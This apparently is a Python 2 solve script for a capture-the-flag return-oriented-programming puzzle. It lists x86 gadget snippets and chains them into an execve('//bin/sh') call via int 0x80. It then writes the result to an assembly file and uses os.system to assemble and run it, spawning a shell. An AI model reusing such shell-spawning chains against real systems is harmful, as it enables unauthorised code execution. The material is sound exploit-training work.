#!/usr/bin/env python
import os

print"0.    int 0x80" 
print"    pop ebp"
print"    pop edi"
print"    pop esi"
print"    pop ebx"
print"============================"
print"1.  pop ebx"
print"    pop ebp"
print"    xor eax,eax"
print"============================"
print"2.  sub ecx,eax"
print"    pop ebp"
print"============================"
print"3.  mov edx,eax"
print"    pop ebx"
print"============================"
print"4.  pop ecx"
print"    pop eax"
print"============================"
print"5.  mov (esp),edx"
print"============================"
print"6.  pop edx"
print"    pop ecx"
print"    pop edx"
print"============================"
print"7.  add ecx,eax"
print"    pop ebx"
print"============================"
print"8.  add eax,0x2"
print"============================"
print"9.  push esp"
print"    push ebp"
print"============================"
print"10. push 0x68732f6e"
print"    push 0x69622f2f"
print"============================"
print"11. push 0x67616c66"
print"    push 0x2f2f706f"
print"    push 0x722f2f65"
print"    push 0x6d6f682f"
print"============================"
print"12. push 1"
print"    push 2"
print"============================"
print"13. push eax"
print"============================"
print"You can arrange what you like with the instructions.(e.g. 1,3,1,5,2)"
print"Ref: http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html"
print"Please assemble your assembly to get /home/rop/flag:"


chain = []
# stack = 0,0,0,0 ......., to give ecx edx
chain += [13,13,13,13,13,13,13,13]
# eax = 11
chain += [1,12,4,8,8,8,8,8]
# *ebx = "\\bin\sh"
chain += [10,9,3,3]
# ecx = 0, edx = 0
chain += [6,6]
# int 0x80
chain += [0]

#chain = [12,4,10,9,2,7,13,13,2,2,8,8,8,8,8,0]

text = "global  _start\nsection .text\n_start:\n"
# start from 0x08048060
for x in chain:
    if x == 0:
        text += "\tint 0x80\n\tpop ebp\n\tpop edi\n\tpop esi\n\tpop ebx\n"
    elif x == 1:
        text += "\tpop ebx\n\tpop ebp\n\txor eax,eax\n"
    elif x == 2:
        text += "\tsub ecx,eax\n\tpop ebp\n"
    elif x == 3:
        text += "\tmov edx,eax\n\tpop ebx\n"
    elif x == 4:
        text += "\tpop ecx\n\tpop eax\n"
    elif x == 5:
        text += "\tmov (esp),edx\n"
    elif x == 6:
        text += "\tpop edx\n\tpop ecx\n\tpop edx\n"
    elif x == 7:
        text += "\tadd ecx,eax\n\tpop ebx\n"
    elif x == 8:
        text += "\tadd eax,0x2\n"
    elif x == 9:
        text += "\tpush esp\n\tpush ebp\n"
    elif x == 10:
        text += "\tpush 0x68732f6e\n\tpush 0x69622f2f\n"
    elif x == 11:
        text += "\tpush 0x67616c66\n\tpush 0x2f2f706f\n\tpush 0x722f2f65\n\tpush 0x6d6f682f\n"
    elif x == 12:
        text += "\tpush 1\n\tpush 2\n"
    elif x == 13:
        text += "\tpush eax\n"
text += "\timul ebx,eax,0x61626364\n"
print chain
print "==== Your Code ===="
print text

file = open('input.s', 'w')
file.write(text)
file.close()

os.system("nasm -f elf32 input.s && ld -m elf_i386 -o a.bin input.o && ./a.bin")
